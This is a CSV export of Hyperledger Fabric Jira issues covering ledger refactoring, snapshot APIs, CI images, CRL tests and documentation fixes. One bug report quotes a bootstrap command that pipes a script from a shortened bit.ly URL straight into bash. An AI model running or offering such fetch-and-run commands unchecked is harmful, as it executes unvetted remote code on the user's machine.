 ",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01afn:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
use either fetch or get or retrieve consistently ,FAB-17684,44700,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,29/Mar/20 3:29 PM,29/Mar/20 3:29 PM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01afv:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
need to decide on common/ledger/testutil,FAB-17685,44701,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,Senthil1,Senthil1,Senthil1,29/Mar/20 11:48 PM,04/Apr/20 6:51 PM,28/Oct/23 3:09 AM,04/Apr/20 6:51 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ag3:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
statedb.StateDBConfig is stutters ,FAB-17686,44702,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,Senthil1,Senthil1,Senthil1,30/Mar/20 6:02 PM,28/Apr/20 12:24 PM,28/Oct/23 3:09 AM,28/Apr/20 12:24 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01agb:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rename AddValue(),FAB-17687,44704,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,tsharris,tsharris,30/Mar/20 11:18 PM,31/Mar/20 5:18 AM,28/Oct/23 3:09 AM,31/Mar/20 5:18 AM,v2.1.0,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"AddValue() should be renamed to something more appropriate given it is used for both the addition and removal of values.

 ",,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjzsi",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tsharris,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Mar/20 2:54 AM;tsharris;[https://github.com/hyperledger/fabric/pull/946];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Add Ledger APIs for Snapshot creation, deletion, and query for available snapshots",FAB-17688,44705,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,31/Mar/20 1:56 AM,05/Oct/20 11:38 PM,28/Oct/23 3:09 AM,05/Oct/20 11:38 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"Introduce a snapshot mgmt component that

Maintains snapshots in a folder ledgersData/snapshots. A specific snapshot for a channel at a certain height H is maintained in folder ledgersData/snapshots/<channelName>/<blockHeight>
 * CreateSnapshot API creates a new folder with four files
 1) Exported collection config history below snapshot height
 2) Exported txids below snaphost height
 3) Exported world state (after pausing the transaction processing)
 4) Exported snapshot metadata in human readable json format
 Metadata to include 
 a) height of the snapshot, 
 b) hashes for txids
 c) hashes for world state
 d) hashses for collection config history
 e) last block hash
 f) last block commit hash
 g) overall hash for snapshot by combining hashes in (b), (c), and (d)

 * DeleteSnapshot API  (DEFERRED till we see the need of it as the admin can directly manage the generated snapshot folder)
 deletes the folder for the snapshot
 * SnapshotsInfo API  (DEFERRED till we see the need of it as the admin can directly manage the generated snapshot folder)
 returns the metadata for all available snapshots",,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-106,,,No,,Unset,No,,,"1|i00wur:0ii9",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add CreateLedgerFromSnapshot API in KVLedgerProvider,FAB-17689,44706,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,manish-sethi,manish-sethi,31/Mar/20 1:57 AM,08/Oct/20 10:26 PM,28/Oct/23 3:09 AM,08/Oct/20 10:26 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"This API takes the filesystem path for snapshot folder instead of genesis block
Perform followings to create ledger
- Populate blockstore index with txids from the from the corresponding file in the snapshot
- Populate collection config history db from the corresponding file in the snapshot
- Use worldstate from the corresponding file in the snapshot and populate 
	     a) statedb, 
	     b) purgeMgr bookkeeping DB, 
	     c) private data store with missing entries, 
	     d) Metadata hint db
- Invoke reconciler without pause to pull the private data
- Enhance blockstore to maintain height, last block hash, and last block commit hash (which is otherwise extracted from the last block)",,manish-sethi,n-horiguchi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-106,,,No,,Unset,No,,,"1|i00wur:0iic",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,n-horiguchi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 Peer APIs for snapshot mgmt and bootstrap a peer,FAB-17690,44707,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,manish-sethi,manish-sethi,31/Mar/20 1:59 AM,27/Oct/20 2:43 AM,28/Oct/23 3:09 AM,27/Oct/20 2:43 AM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,," - CreateSnapshot, DeleteSnapshot, and SnapshotsInfo APIs to invoke corresponding ledger APIs
 - SnapshotsInfo API provides option to return the signature on the metadata as well
 - Provide a variant of Join Channel API that can be invoked with snapshot (instead of genesis block)",,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18105,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-106,,,No,,Unset,No,,,"1|i00wur:0iici",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Aug/20 9:20 PM;manish-sethi;[https://github.com/hyperledger/fabric-protos/pull/40];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update QSCC/history query functions to consider that some channels may have been bootstrapped via snapshot,FAB-17691,44708,45756,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,manish-sethi,manish-sethi,31/Mar/20 2:00 AM,05/Oct/20 11:32 PM,28/Oct/23 3:09 AM,05/Oct/20 11:32 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"Scope of the story:
 * QSCC queries
 * historydb query

Acceptance criteria:
 * GetChainInfo QSCC command is enhanced to return bootstrap snapshot metadata and latest snapshot metadata
 * QSCC queries return proper error message when the input block number and txid are below the bootstrap snapshot height
 * Historydb query will not include entries for blocks/transactions below the bootstrap snapshot height. Because history may be incomplete in this case, it is not recommended to transact based on history data. Need to document it.",,manish-sethi,n-horiguchi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17798,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Yes,Unset,,,,,No,,Unset,No,,,"1|i00wur:0ip",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,n-horiguchi,wenjian,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Sep/20 2:52 AM;wenjian;PRs: 

https://github.com/hyperledger/fabric-protos/pull/43

https://github.com/hyperledger/fabric/pull/1922;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enhance LTE to measure the performance impact of snapshot creation,FAB-17692,44709,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,manish-sethi,manish-sethi,31/Mar/20 2:01 AM,07/Dec/20 11:26 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-106,,,No,,Unset,No,,,"1|i00wur:0ipj",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create Single Repository for All Fabric CI Images,FAB-17693,44710,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,btl5037,btl5037,31/Mar/20 2:54 AM,12/Jun/20 12:29 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-ci,,,,,,,,,0,,,,,,"As we begin adopting more and more docker based CI jobs, we create a central repository for storing the Dockerfile's and dependencies.

We can then build and publish them to hyperledger-fabric.frog.io instead of hosting them in our own repo.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb8o",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ensure CRL can be signed by intermediate CA cert,FAB-17694,44711,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,31/Mar/20 4:02 AM,13/Apr/20 9:35 PM,28/Oct/23 3:09 AM,13/Apr/20 9:35 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"Follow-up work to FAB-17659 (and the TODO in msp_test.go TestCreateApplicationMSPCRL() ):

Currently, our unit tests generate their MSP configuration using baseMSP(), which generates one cert and sets it as the root and intermediate cert (and all other certs in the config). The refactoring of MSP functions in FAB-17659 included validating that the certificate you supply to sign a CRL is one of the root or intermediate CA certs in the MSP configuration. 

We need a test to ensure an intermediate cert (that is not the same as the root cert) can be used to sign a CRL.",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17659,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzy",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Apr/20 6:34 AM;wlahti;https://github.com/hyperledger/fabric/pull/1014;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
`Bootstrap.sh` failure due to missing tag(v2.0.0) in `fabric-samples`,FAB-17695,44712,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,gurrpi,gurrpi,31/Mar/20 12:46 PM,05/Apr/20 11:24 AM,28/Oct/23 3:09 AM,05/Apr/20 11:24 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,," `cloneSamplesRepo()` function in [bootstrap.sh|[https://github.com/hyperledger/fabric/blob/master/scripts/bootstrap.sh#L51-L67]] fails like below since `fabric-samples` only have `v2.0.0-alpha` and `v2.0.0-beta`.
{code:java}
$ curl -sSL http://bit.ly/2ysbOFE | bash -s
Clone hyperledger/fabric-samples repo
===> Checking out v2.0.0 of hyperledger/fabric-samples
error: pathspec 'v2.0.0' did not match any file(s) known to git.
{code}
 ",,btl5037,gurrpi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,b155620192d519eaf31efb2bd63d8322459a0acc,Unset,No,,,"1|i01ai3:",,,,Unset,Unset,,"curl -sSL http://bit.ly/2ysbOFE | bash -s",,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,gurrpi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Apr/20 11:24 AM;btl5037;This isn't a bug, we are aware of this (we were waiting to finish work around the test-network), but as the current `master` branch is going to be tagged as `v2.0.0` the failure doesn't have any side effects. When it fails you are left on the current master and everything works completely as expected since master will become v2.0.0, this is an error you can ignore in this scenario.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
link to maintainers meetings is misleading,FAB-17696,44713,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,pandrejko,MHBauer,MHBauer,31/Mar/20 1:12 PM,03/Apr/20 11:17 PM,28/Oct/23 3:09 AM,03/Apr/20 11:17 PM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"On page

[https://hyperledger-fabric.readthedocs.io/en/master/CONTRIBUTING.html]

for master and 2.0 there is a link to

[https://wiki.hyperledger.org/display/fabric/Maintainer+Meetings]

which is page not found, and suggests ""Contributor Meetings 2019"" [https://wiki.hyperledger.org/display/fabric/Contributor+Meetings+2019]

Are contributor meetings the same as maintainer meetings?

Should this link to the top level [https://wiki.hyperledger.org/display/fabric/Contributor+Meetings] instead, so that it cannot get as out of date?

 ",,MHBauer,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aib:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),MHBauer,pandrejko,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Apr/20 10:08 PM;pandrejko;PR: https://github.com/hyperledger/fabric/pull/976;;;","03/Apr/20 11:17 PM;pandrejko;Published here: 
master: [https://hyperledger-fabric.readthedocs.io/en/latest/CONTRIBUTING.html#contributor-meeting]
release-2.0  [https://hyperledger-fabric.readthedocs.io/en/release-2.0/CONTRIBUTING.html#maintainers-meeting]
release-1.4 [https://hyperledger-fabric.readthedocs.io/en/release-1.4/CONTRIBUTING.html#contributor-meeting]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mv encoding util to consumer (pvtdatastorage),FAB-17697,44714,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,31/Mar/20 1:53 PM,01/Apr/20 2:43 AM,28/Oct/23 3:09 AM,01/Apr/20 2:43 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"When missing pvtData reconciler asks for missing data info, it is necessary to pass the missing pvtdata info associated with the most recent block so that missing pvtdata in the state db can be fixed sooner to reduce the ""pvtdata does not match with hashed data"" error during endorserment. In order to give priority to missing pvtData in the most recent block, we use reverse order-preserving encoding/decoding. This simplifies the implementation
 of GetMissingPvtDataInfoForMostRecentBlocks().

 

Currently, this encoding/decoding is present in the core/ledger/util. Given that it is used only in pvtdatastorage package and we need to keep such code close to the consumer, we move the endcoding/decoding util to pvtdatastorage package itself.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aij:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mv couchdb index artifact retrieval to internal/pkg,FAB-17698,44716,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,Senthil1,Senthil1,Senthil1,01/Apr/20 3:08 AM,15/Apr/20 10:33 AM,28/Oct/23 3:09 AM,10/Apr/20 2:01 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"The couchdb index path format is hardcoded in many places. It requires a separate refactoring which involves core/common/ccprovider.
We may need to move core/common/ccprovider to internal/pkgs and fix hardcoded path.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01air:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rm unnecessary import dependency from statecouchdb package,FAB-17699,44717,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,01/Apr/20 4:49 AM,08/Apr/20 12:46 AM,28/Oct/23 3:09 AM,08/Apr/20 12:46 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"The statecouchdb package should not be dependent on too many other packages. It should be self-sufficient. Currently, we have imported ccprovider just for a struct. As this is not justified, we remove it.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aiz:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix wrong docker rmi command in documents,FAB-17700,44722,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Low,Done,tatsu-sato,tatsu-sato,tatsu-sato,02/Apr/20 8:14 AM,19/Apr/20 12:31 PM,28/Oct/23 3:09 AM,19/Apr/20 12:05 PM,v2.0.1,v2.1.0,,,,,,,,v2.1.0,,,,fabric-docs,,,,,,,,,0,,,,,,"We need to fix the command to remove images on chaincode containers in *fabric/docs/source/build_network.rst* and *fabric/docs/source/test_network.md*.

The target command is the following:
{noformat}
docker rmi -f $(docker images | grep peer[0-9]-peer[0-9] | awk '{print $3}')
{noformat}
It should be:
{noformat}
docker rmi -f $(docker images | grep dev-peer[0-9] | awk '{print $3}')
{noformat}",,denyeart,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ak3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,tatsu-sato,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Apr/20 12:05 PM;denyeart;Merged in master.

Backporting to release-2.1.

I'll mark as Done.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Clean up prereq doc,FAB-17701,44723,,Documentation,In CR Review,FAB,Fabric,software,denyeart,,,Medium,,pandrejko,denyeart,denyeart,02/Apr/20 11:22 PM,26/Feb/21 11:18 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-docs,fabric-release,,,,,,,,0,,,,,,"The prereq doc https://hyperledger-fabric.readthedocs.io/en/latest/prereqs.html is all over the map and needs to be cleaned up. In some cases it's talking about using fabric, in some cases its talking about developing Fabric, and in some cases its talking about building applications for Fabric. Often times the context for a given prereq is not mentioned.

For more details see comments in https://github.com/hyperledger/fabric/pull/940",,denyeart,mbwhite,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrhk:r",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,mbwhite,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Apr/20 4:10 AM;pandrejko;[~denyeart]I started the PR here: [https://github.com/hyperledger/fabric/pull/1120]

 

Can I also remove these sections:
 [https://hyperledger-fabric.readthedocs.io/en/latest/prereqs.html#node-js-runtime-and-npm]

[https://hyperledger-fabric.readthedocs.io/en/latest/prereqs.html#python]

https://hyperledger-fabric.readthedocs.io/en/latest/prereqs.html#windows-extras;;;","19/Apr/20 11:59 AM;denyeart;[~pandrejko]

The node.js and python info is applicable for Node.js SDK applications, so I agree let's remove from core Fabric prereq doc section and ensure there is coverage in Node.js SDK docs. Let's ask [~heatherp]   [~mbwhite]  [~sstone1] to confirm. 

The windows extras applies to regular Fabric 'users' that use curl to download and run docker images, so I think that section can remain in the prereqs doc, although we can remove the language around developing Fabric and 'make', and instead in the developer contribution guide mention that the same Windows guidance would apply.;;;","20/Apr/20 5:10 PM;mbwhite;[~denyeart] [~pandrejko]

Yes there is some guidance in the API docs and git repos for the chaincode and client SDKs.  Though improvement can be made there. 

There are sections for both Chaincode and Client SDKs in the Getting Started- these could be good places to add pre-reqs for the development. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Using the CA to the Operations Guide,FAB-17702,44724,32076,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,pandrejko,pandrejko,03/Apr/20 5:11 AM,17/Jul/20 6:56 AM,28/Oct/23 3:09 AM,11/Jul/20 2:23 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"Admittedly this content will overlap with what is already available in the CA Users and Operations Guide, but the point here is for this content to align with the new CA deployment instructions in the Fabric documentation.

In general, it should cover for a Production network:
 - Using the Fabric CA client CLI and the generated client .yaml file.

 - When/Why/How to register users
 - When/Why/How to enroll users

 - Hints/Tips/Tricks (i.e. --save flag on the identity list command, renaming certificates)
 - Starting content for building an MSP

 * Configuring the list of trusted TLS CAs https://github.com/hyperledger/fabric/blob/master/sampleconfig/orderer.yaml#L28",,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01akj:",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,release-1.4,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
